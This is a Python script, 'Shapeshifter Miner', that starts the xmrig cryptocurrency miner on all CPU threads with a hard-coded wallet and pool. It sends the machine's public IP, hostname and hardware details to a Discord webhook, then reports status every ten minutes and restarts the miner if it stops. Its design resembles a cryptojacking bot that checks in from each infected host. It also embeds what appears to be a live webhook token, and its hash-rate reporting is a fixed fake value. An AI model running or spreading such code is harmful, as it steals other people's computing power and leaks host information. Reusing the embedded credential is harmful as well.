import os
import platform
import subprocess
import time
import socket
import requests
import psutil
import json

# --- Configuration ---
CONFIG = {
    "WEBHOOK": "https://discord.com/api/webhooks/1395138384518844508/riuLCmuUuVfVZECJE-zW75VwARH2p9jd8yP_Z1ndjP4gvNMH08Mf7C9PpXcITM-nmw8B",  # Replace with your Discord Webhook URL
    "WALLET": "ZEPHYR2zxTXUfUEtvhU5QSDjPPBq6XtoU8faeFj3mTEr5hWs5zERHsXT9xc6ivLNMmbbQvxWvGUaxAyyLv3Cnbb9MgemKUED19M2b",  # Replace with your Monero wallet address
    "POOL": "fr.zephyr.herominers.com:1123",  # You can customize this if needed
    "WORKER_NAME": "worker001",  # Your worker name
    "CPU_THROTTLING": "100",  # CPU Throttling (Set between 0 and 100)
    "GPU_THROTTLING": None,  # GPU Throttling if available, set None if not using GPU
}

# --- Script Logic ---
def get_system_info():
    """Gather system information for Discord webhook"""
    system_info = {
        "IP": requests.get("https://api.ipify.org").text.strip(),
        "Hostname": socket.gethostname(),
        "OS": platform.system() + " " + platform.release(),
        "Arch": platform.machine(),
        "CPU": subprocess.getoutput("lscpu | grep 'Model name' | cut -d ':' -f2").strip(),
        "RAM": subprocess.getoutput("free -h | awk '/Mem/ {print $2}'").strip(),
        "Threads": str(psutil.cpu_count(logical=True)),
    }
    return system_info

def send_notification(message):
    """Send a notification to Discord webhook"""
    try:
        requests.post(CONFIG["WEBHOOK"], json={"content": message})
    except Exception as e:
        print(f"Error sending notification: {e}")

def get_hash_rate():
    """Retrieve current hash rate (simulated for Monero in this example)"""
    # You can modify this with actual mining software hash rate retrieval logic
    hash_rate = "100 H/s"  # This is a simulated value, replace with actual hash rate fetching logic
    return hash_rate

def start_miner():
    """Start the mining process"""
    try:
        cmd = ["xmrig", "-o", CONFIG["POOL"], "-u", CONFIG["WALLET"], "--donate-level", "1", "-k", "-t", str(psutil.cpu_count(logical=True))]
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return process
    except Exception as e:
        send_notification(f"❌ Miner failed to start: {e}")
        raise

def monitor_miner(process):
    """Monitor the miner process and restart it if needed"""
    try:
        stdout, stderr = process.communicate(timeout=10)  # Check for any miner output
        if process.returncode != 0:
            send_notification(f"❌ Miner error: {stderr.decode()}")
            return False
        return True
    except subprocess.TimeoutExpired:
        return True  # Miner is still running
    except Exception as e:
        send_notification(f"❌ Miner crash detected: {e}")
        return False

def main():
    """Main script loop"""
    send_notification("🚀 Shapeshifter Miner starting...")
    system_info = get_system_info()
    message = f"✅ Miner Initialized\nIP: {system_info['IP']}\nHostname: {system_info['Hostname']}\nOS: {system_info['OS']}\nCPU: {system_info['CPU']}\nRAM: {system_info['RAM']}\nThreads: {system_info['Threads']}\nWorker: {CONFIG['WORKER_NAME']}"
    send_notification(message)

    # Start mining
    miner_process = start_miner()

    while True:
        time.sleep(600)  # 10 minutes delay

        # Check the mining status and hash rate
        hash_rate = get_hash_rate()
        message = f"🧠 Mining Update\nHash Rate: {hash_rate}\nWorker: {CONFIG['WORKER_NAME']}"
        send_notification(message)

        # Monitor miner process
        if not monitor_miner(miner_process):
            send_notification("🔁 Miner restarting...")
            miner_process = start_miner()

if __name__ == "__main__":
    main()
